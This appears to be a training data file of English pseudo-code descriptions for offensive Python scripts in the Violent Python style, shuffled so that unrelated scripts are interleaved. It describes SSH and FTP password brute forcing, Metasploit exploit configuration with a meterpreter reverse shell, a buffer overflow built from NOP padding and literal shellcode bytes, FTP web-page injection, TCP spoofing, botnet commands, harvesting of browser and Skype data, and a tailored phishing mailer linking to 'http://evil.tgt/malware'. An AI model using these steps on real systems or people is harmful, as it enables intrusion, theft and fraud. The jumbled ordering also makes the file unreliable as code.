@@ -1,0 +1,902 @@
+Create a parser with OptionParser 'usage %prog -p <pcap file> -t <thresh>'
+Define the function retGeoStr with argument ip
+Assign to the variable host the value 'localhost'
+Define the function printPcap with argument pcap
+Call the function exit  with argument 0
+Change the scope of the variable Fails to global
+Assign to filename the function join of path of os with arguments dir and the method replace with arguments '/' and '_' of filename
+Remove from search 'q=' and '+'
+Import the library for the regular expressions
+Read the file passwdFile and assign it to pF
+Call function pxssh of library pxssh with no arguments and assign it to s
+Assign to long the field 'longitude' of rec
+Assign to THRESH the value thresh of options
+Define the class Google_result
+If count of options is equal to None
+Assign to url the url of options
+Assign to dirs a list containing 'C:\\Recycler\\','C:\\Recycled\\','C:\\$Recycle.Bin\\'
+Call the function findRecycledDir
+Import the library to interact with operative system
+Get the record for that IP and assign it to rec
+Assign the variable user of options to user
+Assign to pkts the result of the function rdpcap with argument 'domainFlux.cap'
+Assign to mapLon the value 'N/A'
+Import the library to scan the ports
+Call the function open with argument imgFileName and 'wb' and assign it to imgFile
+Assign to ans the result of the functionsr1 with argument pkt and verbose equals to 0
+Continue the arguments with help equals to 'specify PDF file name'
+Call the function sniff with argument prn equals testTTL and store equals to 0
+Exit the function with user value
+Define the function testForExif with argument imgFIleName
+Define the function addClient with arguments host, user and password
+Define the function scanTest with arguments src, dst, iface and count
+Continue the argument and concatenation with  'windows/meterpreter/reverse_tcp\n'
+Exit function with value False
+Assign to title the result with key 'titleNoFormatting'
+Add the option of the parser H for tgtHost as a string with help specify target host
+For each attempt from 1 to 5
+Call the method strip with argument ' ' of addr, call the method replace with arguments ' ' and ':', take the values from 0 to 17 and assign it to addr
+Call the member function user of options and assign it to user
+Start except block
+Call the method add_option with arguments '-k', dest equals to 'keyword', type equals to 'string' and help= equals to 'specify target url'
+Assign to platform the value argv at position 2 of sys
+Assign to parser the OptionParser with argument the concatenation of 'usage %prog ' and '-k <keywords>' of optparse
+Get the record for that IP and assign it to rec
+Call the method start of t and assign the result to child
+Do nothing
+Assign to city the field 'country_code3' of rec
+Parse the usage prod pd target host, the target port, the user and the directory
+Assign to iface of conf the value iface of options
+Assign to host the value of the function str with argument row at the position 0
+Call the function findTgts with argument tgtHost of options and assign it to tgtHosts
+Change the scope of the variable Found to global
+Assign the variable tgtHost of options to host
+For each item in dnsRecords
+Exit function with argument True
+For each sid in dirList
+Call the function  scanTest with arguments src, dst, iface and count
+Assign to respURL the value 'http://wigle.net/gps/gps/main/confirmquery/'
+If the substring '!lazor' is in data of tcp in lower case
+Call the method write of configFile with argument 'set payload ' and concatenate next line
+From the library used for interact with windows registry import everything
+and "\xde\xf4\x5b\x8c\xf1\x58\xd5\x6a\x9b\x70\xb3\x25\x33\xb3" 
+Import the library for file transfer protocol
+If sport is equal to 6667
+Call the function bruteLogin with argument host and passwdFile
+Call the function injectPage with arguments ftp, 'index.html' and redirect
+Assign to url of self the value url
+If pktsSent is more than THRESH
+Call the method write with argument imgContent of imgFile
+Execute the command "select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;"on c
+Else
+Append the new_gr to the list results
+If the method has_key with argument ipsrc of ttlValues is not True
+Define the function mirrorImages with argument url and dir
+Call the method add_option with arguments '-u', dest equals to 'tgtURL', type equals to 'string' and help equals to 'specify target url'
+Start expect block
+Instantiate a Semaphore named screenLock initialized with variable values equals 1
+Return the variable kmlPts
+Exit the cycle
+Add the option of the parser u for user as a string with help specify the user
+Read all the network traffic from f and assign it to pcap
+Call the function printHistory with argument placesDB
+Assign to IPlayer the result of the function IP with src equals src and dst equals to tgt
+Call the method anonymize with no argument of ab
+Call the function send with argument pkt
+Call function connect with arguments '127.0.0.1', 'root' and 'toor'
+Assign to mapLat the value 'N/A'
+Assign to the tuple options and args the method parse_args with no arguments of parser
+For each result in response with keys 'responseData' and 'results'
+Assign to hideMeProxy the dictionary with key 'http' and value equals to '216.155.139.115:3128'
+If the functions len with argument argv of sys returns a value bigger than 2
+Open the url and assign it to page
+Call the method send with argument "PASS \r\n" of s
+Assign to ip the data of eth
+Assign to tgt the tgt of options
+Call the object PdfFileReader with argument file with arguments fileName and 'rb' and assign it to pdfFile
+Call the method add_option with arguments '-F', dest equals to 'fileName' and type equals to 'string' of parser
+Assign to msgDirection the concatenation of From, the function str with argument row at position 1 and :
+Assign to TCPlayer the result of the function TCP with argument sport equals to 513 and dport equals to 514
+Call the function PortScanner with no argument from the library nmap and assign 
+Return the title of self
+For each line in the method readlines with no argument of pF
+Call method acquire on screenLock with no arguments
+Call the method tgtHost on options and assign the result to tgtHost
+Call the method _getexif with no argument of imgFile and assign it to info
+Assign to text of self the value text 
+Assign to perm_denied the value 'Permission denied'
+If the substring encrypted is in the string e
+Import the library for parsing
+Call the method pxssh with no arguments of the package pxssh and assign it to s
+Create an empty dictionary and assign it to dnsRecords
+Parse the argument into the tuple made of options and args
+Call the function EnumValue with argument netKey and 4  and assign the result to the tuple n, name and  t
+Assign to dst the tgt of options
+Parse the usage prod pd target host and the target port 
+Call the function anonLogin with argument host
+From the library to manipulate Exif data of image import TAGS
+Import the library to parse html and xml
+Define the function with anonLogin with argument hostname
+Do nothing
+Import the library to interact with a sqlite database
+Define function botnetCommand with argument command
+Start expect block
+If preNum is not equal to 0
+Call the function printRecord with argument tgt
+Assign to date the result of the function str with argument row at the position 0
+If the substring partlist is not in the function str with argument row at the position 3
+Assign to THRESH five
+Call function gethostbyaddr with argument tgtIP assign the result to tgtName
+Call the function printNets with arguments username and password
+Call the method write of configFile with argument 'set LPORT' concatenated to the function str with argument lport concatenated to '\n'
+Assign to ttlValues at the key ipsrc the value ttl of pkt
+Call the function portScan with arguments tgtHost and tgtPorts
+If thresh of options is not None
+If url is equal to None
+Exit function returning value self.session.before
+Call the method send with argument "USER anonymous\r\n" of s
+Call the function split of rLon at the position 0 and assign it to mapLon
+Assign to crash the value "\x41" multiply by 246 concatenated to ret concatenated to paddling concatenated to shellcode
+Call the method back with no argument of ab
+Import the library to manage cookies
+Assign to value the value of the function str with argument row at the position 2
+Assign to command the value argv at position 2 of sys
+Return an empty string
+Else 
+Call method sendline with argument cmd on s
+From the library to manipulate Pdf import PdfFileReader
+Call the object BeautifulSoup with argument urlContent and assign it to soup
+Close the save file
+Call the method write of configFile with argument 'use exploit/windows/smb/ms08_067_netapi\n'
+Execute the command 'SELECT tbl_name FROM sqlite_master WHERE type==\"table\";' on c
+Import the library for spawning applications
+Assign to kmldoc the concatenation of kmlheader the result of the function plotIPs with argument pcap and kmlfooter
+Assign to ab the anonBrowser with parameters proxies equals to an empty list and user_agents equals to a list with inside a tuple made of 'User-agent' and 'superSecretBrowser'
+Define main function with no arguments
+Call the class BoundedSemaphore with argument value equals to maxConnections and assign to connection_lock 
+Call the method parse_args with no argument and assign it to the tuple made of options and args
+Assign to passwdFile the value passwdFile of options
+Call the method write of configFile with argument 'use exploit/windows/smb/psexec\n'
+Call the class Client with argumet host, user and password and assign it to client
+Use the command "SELECT datetime(timestamp,'unixepoch'),dialog_partner, author, body_xml FROM Messages;"
+Assign the result of the method pxssh on pxssh with no argument to s
+Call the method write of configFile with argument 'set payload ' and continue to the next line the argument and the concatenation
+If the variable pcapFile of options is equal to None
+Define the method __init__ with arguments self, title, text and url
+Return results
+Call the method add_option with arguments '-d', dest equals to 'dir', type equals to 'string' and help equals to 'specify destination directory'
+Assign the value password to self.password
+and "\x83\x85\x07\xb0\x53\xf6\x8e\x55\x62\x24\xf4\x1e\xd6\xf8"
+Define the function printNets with argument username and password
+and "\x56\x22\x1c\x43\x22\x98\x1f\x94\x9a\x97\x68\x0c\x91\xf0" 
+Open the document pcapFile and assign it to f
+Execute the command "select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;"on c
+Else if ret equals 3
+Call the method open with argument url of ab and assign it to page
+Define the function printContacts with argument skypeDB
+Call the function spawn with argument connStr of the library pexpect and assign it to child
+Call the method read of page with no argument
+Define the function findRecycled with argument recycleDir
+Create a packet pkt with source src, destination dst, UDP with destination port 31335 and the load equals to 'PONG'
+Call the method get with arguments tag and tag and assign of TAGS and assign it to decoded
+Define the function __init__ with arguments self and handle
+Assign to handle of self handle
+Assign to tweets of self the result of the method get_tweets with no argument of self
+Define the function get_tweets with argument self
+Assign to query the result of the method quote_plus of urllib with argument the concatenation of 'from:', handle of self and ' since:2009-01-01 include:retweets'
+Assign an empty list to tweets
+Assign to browser the class anonBrowser called with no arguments
+Call the method anonymize with no argument of browser
+Assign to response the result of the method open of browser with argument the concatenation of 'http://search.twitter.com/'+ 'search.json?q=' and query
+Assign to json_object the result of the method load of json with argument response
+For each result in json_objects with key 'results'
+Assign to new_result an empty dictionary
+Assign to new_result with key 'from_user' the value of result with key 'from_user_name'
+Assign to new_result with key 'geo' the value of result with key 'geo'
+Assign to new_result with key 'tweet' the value of result with key 'text'
+Append to tweets the new_result
+Return the tweets
+Define the function find_interests with argument self
+Create an empty dictionary and assign it to interests
+Create an empty list and assign it to interest with key 'links'
+Create an empty list and assign it to interest with key 'users'
+Create an empty list and assign it to interest with key 'hashtags'
+Assign to the text the value of tweet with jey tweet
+Assign to links the result of the function compile of re with argument '(http.*?)\Z|(http.*?) ' then call the function findall with argument text
+For each link in links
+If link at position 0 exists
+Assign to link the link at the position 0
+Else if link at position 1 exists
+Assign to link the link at the position 1
+Else
+Continue
+Assign to response the result of the method urlopen of urllib2 with argument link
+Assign to full_link the variable url of response
+Append to interests with key links the variable full_link
+Except
+Append to interests with key 'users'  the result of the function findall with argument text called on compile of re with argument '(@\w+)' 
+Append to interests with key 'hashtags'  the result of the function findall with argument text called on compile of re with argument '(#\w+)'
+Sort the list interests with key 'users'
+Sort the list interests with key 'hashtags'
+Sort the list interests with key 'links'
+Return the interests
+Define the function twitter_locate with arguments self and cityFile
+Assign an empty list to cities
+If cityFile is not equal to None
+For each line in the method readlines called with no arguments of the opened file cityFile
+Assign to city the string stripped of '\n' and '\r' in low case
+Append to the list cities the city
+Assign to locations an empty list
+Assign to locCnt the value 0
+Assign to cityCnt the value 0
+Assign to tweetsText an empty string
+For each tweet in tweets of self
+If tweet with key 'geo' is not equal to None
+Append to locations the tweet with key 'geo'
+Increment locCnt of 1
+Concatenate to tweetsText the tweet with key 'tweet' in lower case
+For each city in cities
+If the substring city is in tweetsText
+Append to locations the value city
+Increment cityCnt of 1
+Return the value locations
+Call the method quote_plus of urllib with argument the concatenation of 'from:', handle and ' since:2009-01-01 include:retweets'
+Assign to response the result of the the method open of browser with argument the concatenation of 'http://search.twitter.com/', 'search.json?q=' and query
+Define the function load_cities with argument cityFile
+Assign an empty list to cities
+For each line in the method readlines with no argument of the opened file cityFile
+Assign the line stripped of '\n' and '\r' in lower case to city
+Append city to cities 
+Return the variable cities
+Define the function twitter_locate with arguments tweets and cities
+Assign an empty list to locations
+Assign 0 to locCnt
+Assign 0 to cityCnt
+Assign to tweetsText an empty string
+If tweet with key 'geo' is not equal to None
+Append the tweet with key 'geo' to locations
+Increment locCnt of 1
+Concatenate the tweet with key 'tweet' to tweetsText in lower case
+For each city in cities
+If the substring city is in tweetsText
+Append the city to locations
+Increment cityCnt of 1
+Return the variable locations
+Define the function main with no arguments
+Assign to parser the OptionParser with argument the concatenation of 'usage %prog ' and '-u <twitter handle> [-c <list of cities>]' of optparse
+Call the method add_option with arguments '-c', dest equals to 'cityFile', type equals to 'string' and help= equals to 'specify file containing cities to search'
+Assign cityFile of options to cityFile 
+If handle is equal to None
+Call the function exit to 0
+Assign an empty list to to cities
+If cityFile is not equal to None
+Call the function load_cities with argument cityFile and assign the result to cities
+Assign the result of the function twitter_locate with argument tweets and cities to location
+Import the library dedicated to regular expressions
+Import the second version of the http client
+Define the function get_tweets with argument handle
+Call the method quote_plus of urllib with argument the concatenation of 'from:', handle and ' since:2009-01-01 include:retweets'
+Assign to tweets an empty list
+Assign to browser the class anonBrowser with no argument
+Call the method of browser anonymize with no arguments
+Assign to response the result of the the method open of browser with argument the concatenation of 'http://search.twitter.com/', 'search.json?q=' and query
+Assign to json_objects the result of the method load of json with argument response
+For each result in json_objects with key 'result'
+Assign to new_result an empty dictionary
+Assign to new_result with key 'from_user' the variable result with key 'from_user_name'
+Assign to new_result with key 'geo' the variable result with key 'geo'
+Assign to new_result with key 'tweet' the variable result with key 'text'
+Append to tweets the new_result
+Return the variable tweets
+Define the function find_interests with argument tweets
+Assign to interests an empty dictionary
+Assign to interests with key 'links' an empty list
+Assign to interests with key 'users' an empty list
+Assign to interests with key 'hashtags' an empty list
+For each tweet in tweets
+Assign the tweet with key 'tweet' to text
+Call the method findall with argument text of the function compile with argument '(http.*?)\Z|(http.*?) ' of the library re and assign it to links
+For each link in links
+If link in position 0 exists
+Assign link in position 0 to link
+Else if link in position 1 exists
+Assign link in position 1 to link
+Else
+Continue
+Start try block
+Assign the result of the function urlopen with argument link of urllib2
+Assign the response of url to full_link
+Append full_link to interests with key links
+Excepet
+Do nothing
+Link the result of the function findall with argument text of the function compile with argument '(@\w+)' of re to interests with key 'users'
+Link the result of the function findall with argument text of the function compile with argument '(#\w+)' of re to interests with key 'hashtags'
+Sort the list interests with key 'users'
+Sort the list interests with key 'hashtags'
+Sort the list interests with key 'links'
+Return the variable interests
+Define the main function with no arguments
+Assign to parser the OptionParser with argument the concatenation of 'usage %prog ' and  '-u <twitter handle>' of optparse
+Call the method add_option with arguments '-u', dest equals to 'handle', type equals to 'string' and help= equals to 'specify twitter handle'
+If handle is equal to None
+Call the function exit to 0
+Assign to tweets the result of the function get_tweets with argument handle
+Assign the result of the function find_interests with argument tweets to interests
+Import the library to manage json files
+Import a http client
+From the library to manages an anonymous browser import everything
+Define the class reconPerson
+Define the function __init__ with arguments self, first_name, last_name, job equals to '' and social media equals to {}
+Assign to first_name of self the value first_name
+Assign to last_name of self the value last_name
+Assign to job of self the value job
+Assign to social_media of self the value social_media
+Define the method __repr__  with argument self
+Return the concatenation of first_name of self, ' ', last_name of self + ' has job ' + job of self
+Define the method get_social  with arguments self and media_name
+If the variable social_media of self has the key media_name
+Return the variable social_media with key media_nameof self
+Return nothing
+Define the method query_twitter with argument self and query
+Assign to query the result of the function quote_plus of urllib with argument query
+Assign to results an empty list
+Assign an instance of anonBrowser with no argument to browser
+Assign to response the result of the method open of browser with argument the concatenation of 'http://search.twitter.com/search.json?q=' and query
+Assign to json_object the result of the function json_load of json with argument response
+For each result in json_object with key response
+Assign an empty dictionary to new_result
+Assign result with key 'from_user_name' to new_result with key 'from_user'
+Assign result with key 'geo' to new_result with key 'geo'
+Assign result with key 'text' to new_result with key 'tweet'
+Append new_result to results
+Return results
+Call the function reconPerson with arguments 'Boondock' and 'Saint' and assign it to ap
+Assign 'username' to user
+Assign 'password' to pwd
+Call the function sendMail with argument user, pwd, 'target@tgt.tgt', 'Re: Important' and 'Test Message'
+Import the library to send an email with smtp
+Import the library to parse strings
+From the library to manage the text of the email in mime format import MIMEText
+From twitterClass import everything
+From the library to manage randomess import choice
+define the function sendMail with arguments user, pwd, to, subject and text
+Assign an object MIMEText with argument text to msg
+Assign user to msg with 'From'
+Assign to to msg with key 'To'
+Assign subject to msg with key 'Subject'
+Start try block
+Assign the result of the function SMTP of smtplib with arguments 'smtp.gmail.com and 587 to smtpServer
+Call the method starttls with no argument of smtpServer
+Call the method ehlo with no argument of smtpServer
+Call the method login with arguments user and pwd of smtpServer
+Call the method sendmail with arguments user, to and the method as_string with no argument of msg of smtpServer
+Call the method close with no argument of smtpServer
+Expect
+Do nothing
+Define the main function with no argument
+Assign to parser the OptionParser with argument the concatenation of 'usage %prog ' ,'-u <twitter target> -t <target email> ' and '-l <gmail login> -p <gmail password>' -d <destination directory>' of optparse
+Call the method add_option with arguments '-u', dest equals to 'handle', type equals to 'string' and help equals to 'specify twitter handle'
+Call the method add_option with arguments '-t', dest equals to 'tgt', type equals to 'string' and help equals to 'specify target email'
+Call the method add_option with arguments '-l', dest equals to 'user', type equals to 'string' and help equals to 'specify gmail login'
+Call the method add_option with arguments '-p', dest equals to 'pwd', type equals to 'string' and help equals to 'specify gmail password'
+Assign to the tuple of options and args the result of the method parse_args with no argument of parser
+Assign handle of options to handle
+Assign tgt of options to tgt
+Assign user of options to user
+Assign pwd of options to pwd
+If handle is equal to None or tgt is equal to None      or user  is equal to None or pwd is equal to None:
+Call the function exit with argument 0
+Assign the result of the function reconPerson with argument handle to spamTgt
+Call the method get_tweets with no argument of spamTgt
+Call the method find_interests with no argument of spamTgt to interests
+Call the method twitter_locate of spamTgt with argument 'mlb-cities.txt' and assign it to location
+Assign the concatenation of "Dear", tgt and "," to spamMsg
+If location is not equal to None
+Assign the result of the function choice with argument location to randLoc
+Concatenate the concatenation of " Its me from ", randLoc and "." to spamMsg
+If interests with key 'users' is not equal to None
+Assign to randUser the result of the function choice with argument interests with key 'users'
+Concatenate the concatenation of " ", randUser and " said to say hello." to spamMsg
+If interests with key 'hashtags' is not equal to None
+Assign to randHash the result of the function choice with argument interests with key 'hashtags'
+Concatenate the concatenation of " Did you see all the fuss about ", randHash and "?" to spamMsg
+If interests with key 'links' is not equal to None
+Assign to randLink the result of the function choice with argument interests with key 'links'
+Concatenate the concatenation of " I really liked your link to: ", randLink and "." to spamMsg
+Concatenate to spamMessage the string " Check out my link to http://evil.tgt/malware"
+Call the function sendMail with argument user, pwd, 'target@tgt.tgt', 'Re: Important' and spamMsg
+Call the function connect with arguments user, host, keyfile and False
+Assign to IPlayer the IP with src equals to src and dst equals to tgt
+and "\x7e\x72\xda\x73\xd2\x67\x69\xf1\xfb\x88\xda\xbc\xdd\xa7" 
+Send the packet to iface and count equals count
+Call the object OptionParser with argument 'usage %prog " of optParse and assign it to parser
+If synSpoof of options is equal to None or if srcSpoof of options is equal to None or if tgt of options is equal to None
+If the function isMessageTable with argument iphoneDB returns True
+Import the library to manipulate request and response for http pages
+Set cookie_jar as a cookie collector of browser
+Take the second argument of stream splitted at ':'  and assign it to dst
+Call the function CloseKey with argument netKey
+Define the function nmapScan with arguments tgtHost and tgtPort
+Assign to Fails the value 0
+Add the option of the parser H for tgtHost as a string with help specify target host
+Call the function printLinks with argument url
+Call the function testProxy with argument url and hideMeProxy
+Import the libraries for file transfer protocol and time management
+and "\xe0\xfd\xa4\xcc\xc2\x51\x7d\x5b\x5a\xbc\xb9\x64\x5b\xea" 
+and "\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
+Use c as a cursor for conn
+Call the function botnetCommand with argument 'cat /etc/issue'
+Call the function printDownloads with argument downloadDB
+Assign to the variable password the value 'toor'
+Call function FTP with argument hostname of the library ftplib and assign it to ftp 
+If the substring '.php' or the substring '.htm' or the substring '.asp' is found in fn
+Call the function str with argument name and assign it to netName
+Call the function close with no argument of configFile
+Continue the line with args equals to the tuple containing user, host, fullpath and True
+and "\x41\x28\x01\xe5\x3c\x6d\x3e\xca\xa8\x79\x47\x36\x49\x85" 
+Call the function findHivemind of pcap
+Exit function with no argument
+Assign to ackPkt the IPlayer divided by the TCPlayer
+Call the method gethostbyname with argument tgtHost and assign the result to tgtIP
+Import the library to interact with the opearative system
+Define the function printProfile with argument skypeDB
+Assign to pkt the value of the function sr1 with arguments IP with argument dst equals to ipsrc, ICMP with no arguments, retry equals to 0, timeout equals to 1 and verbose equals to 0
+Import the library to manage url
+Assign to iface the value iface of options
+define the class Client
+If the method has_key with argument rrname of dnsRecords is True
+Define the function wiglePrint with argument username, password and netid
+If the method iptype with no argument of the function IPTEST with argument ipsrc is equal to "PRIVATE"
+Call the function returnDefault with argument ftp
+Assign to pathName the pathName of options
+Call the function smbBrute with arguments configFile, tgtHost, passwdFile, lhost and lport
+Define the function isMessageTable with argument iphoneDB
+Define the function spoofConn with arguments src, tgt and ack
+Import the library to interact with the python environment
+Connect to the database cookiesDB and assign it to conn
+Add the options to parser '-t', dest equals to 'thresh', type equals to 'string',  help equals to 'specify threshould count'
+Define function connScan with parameters tgtHost and tgtPort
+Start block expect
+Call the method start on t and assign it to child
+Import the second version of http client
+Assign to region the field 'region_name' of rec
+Define the function connect with arguments user,host,keyfile and release
+and "\xd8\xa5\x68\xa7\xb1\xa2\xda\x58\xb5\xf7\xe6\x59\x19\x7c" 
+Call the method lower with no argument of fileName and assign it to fn
+Assign to diffSeq the difference of seqNum with preNum
+Call exit function with argument 0
+Assign to s the object socket with arguments AF_INET of socket and SOCK_STREAM of socket of socket
+Else if the folder does not exists
+Call method expect with argument PROMPT of child
+Call the function connect with arguments user, host and password and assign it to child
+Start the try block
+Exit the function with argument False
+Add the options to parser '-p', dest equals to 'pcapFile', type equals to 'string',  help equals to 'specify pcap filename'
+Define the function testTTL with argument pkt
+Import the library for port scanning
+Assign to name the value of the function str with argument row at the position 1
+Increment unAnsReqs of one
+and "\xbd\xca\x85\xe3\xd7\xc4\xfa\x14\xd8\x0e\x8d\x12\x16\x6a" 
+If the substring message is in the function str with argument row
+Assign to geoLoc the variable country
+Define the function main
+Assign to data the method read with no argument of the method open with argument image with key 'src' of ab
+Assign 0 to preNum
+Import the library to interact with the operative system
+Assign to ipsrc the src of the method getlayer with argument IP of pkt
+Assign the value False to the variable Found
+For each sport in range from 1023 to 65535
+Assign to params at the key 'netid' the value netid
+From the library to manipulate network packets import everything
+Assign to downloadDB the path of 'downloads.sqlite' joined with pathName
+Exit function with argument False
+If value Stop is true
+and "\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10" 
+Call the function storlines of ftp with arguments 'STOR ' concatenated to page and the function open with argument page concatenated to '.tmp'
+Call the method PortScanner with no argument and assign the result to nmScan
+Call the method add_option with arguments '-u' dest equals to 'username' and type equals to 'string',
+Assign to title of self the value title
+For each client in botNet
+Assign the value 0 to the variable Fails
+import the library for instantiate a ssh function
+Connect to the database skypeDB
+For each host in the method all_hosts called with no arguments of nmScan
+Call the object OptionParser with arguments 'usage %prog '
+Call the class Thread with arguments target equals to connect, args equal to the tuple host and user and assign it to t
+Call the method scan with arguments tgtHost and tgtPort on nmScan
+Define the function printCookies with argument cookiesDB
+Assign to padding the value "\x90" multiply by 150
+For each filename in the method listdir with argument passDir of os
+Call the method acquire with no arguments of connection_lock
+Assign to city the field 'city' 
+Define the list PROMPT with values '# ', '>>> ', '> ' and '\$ '
+Execute the command 'select datetime(date,\'unixepoch\'),address, text from message WHERE address>0;' on c
+If tgt of options is equal to None
+If host is equal to None or if passwdFile is equal to None or if user is equal to None
+Exit function with value tgtHosts
+Define the function checkTTL with arguments ipsrc and ttl
+Assign the value 'guest' to userName
+Send the messsage 'ViolentPython\r\n'
+If ret is equal to 0
+Assign the value from nmScan sliced from host, 'tcp', 445 and 'state' and assign it to state
+If release is equal to true
+If __name__ equals '__main__'
+Import the library for connections, the library to interact with the system, the library to manage time and the library containing structures
+Assign to pcapFile  the variable pcapFile  of options
+Call the method open with arguments 'https://wigle.net/gps/gps/main/login' and reqData of browser
+Import the library to manage regular expressions
+Import the library to manage sockets
+Exit function with value ''
+Assign to username the value username of options
+If the method haslayer with argument IP of pkt is equals to True
+Continue the dictionary and the function with key 'credential_1'and value password
+Assign to pkts the result of the function rdpcap with argument 'fastFlux.pcap'
+Call the method login with userName and passWord
+Call the function close of of with no argument
+Continue the argument with  '-u <wigle username> -p <wigle password>'
+Call the function OpenKey with arguments key and the result of the function str with argument guid and assign it to netKey
+Assign to userName the value 'guest'
+Add the option -u for user with type string and help as specify password file
+For each password in the method readlines called with no arguments of pF
+Start except block
+Exit function with value True
+Import the libraray for parsing
+Import the library to manipulate Pdf files
+Define the function handlePkt with argument pkt
+Call the method sendline with argument cmd on self.session
+Assign to date the result of function str with argument row at position 1
+Call the method write of configFile with argument 'exploit -j -z\n'
+Assign to qname the value qname of the method getlayer with argument DNSQR of pkt
+Assign to eth a ethernet connection with argument buf
+Assign to url the string 'http://www.syngress.com/'
+Assign to parser the OptionParser with argument  the concatenation of"usage %prog " and  "-p <iPhone Backup Directory>  "
+Return the value s
+Connect to the database placesDB and assign it to conn
+If the value of Found is True
+Assign to url the variable tgtURL of options
+Exit the function with value recycleDir
+Join the paths of pathName and fileName and assign it to iphoneDB 
+Exit the function with argument imgTags
+Call the object Browser with no argument from mechanize and assign it browser
+Assign to c the cursor of conn
+Define the function main with no argument
+If ret is equal to 1
+Call the member variable tgtHost of options and assign it to host
+Call the function connect with arguments host, user, password 
+Add the options to parser '-p', dest equals to 'pcapFile', type equals to 'string',  help equals to 'specify pcap filename'
+Connect to the database iphoneDB and assign it to conn
+Define the function printHistory with argument placesDB
+Call the function Open key with arguments HKEY_LOCAL_MACHINE
+Assign to Stop the value False
+define the method connect with argument self
+and "\x63\x4d\xe7\x79\x74\xb2\xd2\x3e\xea\x4d\xdc\x3e\x22\x8a" 
+Assign an empty list to dirList
+Call the function open with arguments passwdFile and 'r' and assign it to pF
+Assign the value host to self.host
+Assign to response the result of the function open with argument the concatenation of 'http://ajax.googleapis.com/', 'ajax/services/search/web?v=1.0&q=' and search_term of ab
+Close the lock
+Call the function findImages with argument url and assign it to imgTags
+Define the function printMessage with argument msgDB
+Call the method add_option with arguments '-u', dest equals to 'tgtURL', type equals to 'string' and help= equals to 'specify target url'
+Define the function plotIPs with argument pcap
+Receive the response in result
+Increment the variable Fails of one
+Define function setupHandler with arguments configFile, lhost and lport
+Assign to exifGPS the value exifData sliced at 'GPSInfo'
+Assign userAgent to addheaders of browser
+Increase addr with value '%02x ' module of the result of the function ord with argument ch
+Assign to sport the sport of tcp
+Call the function exit with argument 0 of sys
+Assign to connStr the value 'ssh ' concatenated to user
+Call the function EnumValue with argument netKey and 5  and assign the result to the tuple n, addr and  t
+Call the member variable passDir of options and assign it to passDir
+Define the function bruteLogin with arguments hostname nad passwdFile
+Call the method expect on child with value a list composed of pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$' and '#'
+If fileName is equal to None
+Assign to lport the value of lport of options
+Open the filename with option 'wb' and assign it to save
+Use the command "SELECT datetime(begin_timestamp,'unixepoch'),  identity FROM calls, conversations WHERE  calls.conv_dbid = conversations.id;"
+Assign to host the value '192.168.95.179'
+Call the function printCookies with argument cookiesDB
+and "\x7a\xfc\xe3\x7f\xc6\xda\xf3\xb9\xc7\x66\xa7\x15\x9e\x30" 
+Assign to search the value r at the position 0 splitted at '&' at the position 0
+Call the method split with argument ':' on line, take the the result in position 0 and assign it to userName
+Assign to net the value "SOFTWARE\Microsoft\Windows NT\CurrentVersion" and concatenate with next line
+Call the function nmapScan with arguments tgtHost and tgtPort
+Continue the line with '@' concatenated to host concatenated to ' -i ' concatenated to keyfile concatenated to opt
+Call the function printPcap with argument pcap
+If dport is equal to 80
+Call the function urlopen with argument imgRead of urllib2 and call the method read with no arguments and assign it to imgContent
+Assign to exifData an empty dictionary
+If downloadDB is a file
+Else if ret is more than 3
+If the src of options is equal to None
+Call the method release with no argument of connection_lock
+If the iface of options is equal to None
+Call method login with arguments host, user and password
+Define the variable ssh_newkey and assign the value 'Are you sure you want to continue connecting'
+Create a random source IP
+Import the library to use regular expressions
+Assign to lhost the value of lhost of options
+If lport is equal to None
+If pktCount contains the key stream
+Start the try block
+Call method sendline with argument password of child
+Call the function connect with arguments host, user, password 
+Define the function connect with arguments host, user, password and release
+Start expect block
+Define the function findImages with argument url
+Take the first argument of stream splitted at ':' and assign it to src
+If keyword of options is equal to None
+If the function dnsQRTest returns True
+Start the expect block
+Assign to results an empty list
+Call the method scan with arguments subnet and '445' of nmScan
+Assign to ab the class anonBrowser with no arguments
+Start the finally block
+Create an empty dictionary and assign it to ttlValues
+If host is equals to None or passDir is equals to None or User is equals to None
+Import the library to manage regular expression
+For each imgTag in imgTags
+Define function portScan with parameters tgtHost and tgtPorts
+Call the method expect with argument a list composed of the variable TIMEOUT from the library pexpect of child and assign the result to ret
+Define the function retKML with argument ip
+Execute the command 'SELECT host, name, value FROM moz_cookies'on c
+Call the function quit with no argument from the library ftp
+Add the option -F for passwdFile with type string and help as specify password file
+Assign to seqNum the seq of the method getlayer with argument TCP of ans
+Call the function sleep with argument 1 of the package time
+Assign an empty list to botNet
+Increment of one the pktCount at the key stream
+and "\x92\xf2\x79\xcc\xbe\x53\x12\x89\x2b\xe6\x7f\x2a\x86\x25" 
+Call the method open with argument imgFileName of Image and assign the result to imgFile
+Call the function FTP with argument host and assign it to ftp
+and "\x6b\x1e\xfb\x7e\x2d\xfa\xaa\x7f\x2d\xa2\x13\xda\x25\x41" 
+if pathName is equal to None
+If info exists
+Assign to ssh_newkey the value 'Are you sure you want to continue'
+Assign to TCPlayer the result of the function TCP with argument sport equals to 513, dport equals to 514 and ack equals to ack
+Import the library to localize an IP
+Import the library to localize IPs
+Call the function urlencode with argument params from the library urllib and assign it reqParams
+From the library to manipulate paths of os import the function basename
+Download the image imgTag and assign it to imgFileName
+Call the function sid2user with argument sid and assign it to user
+Define the variable maxConnections and assign the value 5
+Create the constant THRESH and assign it to 5
+Call the method write of configFile with argument 'set LHOST' concatenated to the function str with argument lhost concatenated to '\n'
+Import everything from the library for estabilish a connection
+Assign to lport the value '1337'
+Call the function sleep with argument 5 of the package time
+For each row in c
+Assign to placesDB the path of  'places.sqlite' joined with pathName
+Assign to fileName the variable fileName of options
+Call method sendline with argument cmd of child
+Else
+Assign to kmlfooter the string '</Document>\n</kml>\n'
+Assign to filename the result of the method lstrip with argument 'http://'  of image with key 'src'
+Call the function ddosTest with arguments src, dst, iface and count
+Define the function findDownload with argument pcap
+Call the method findAll with argument 'img'
+Call the method open with argument url of ab and assign it to html
+If the substring '.zip' is in uri and the substring 'loic' is in uri
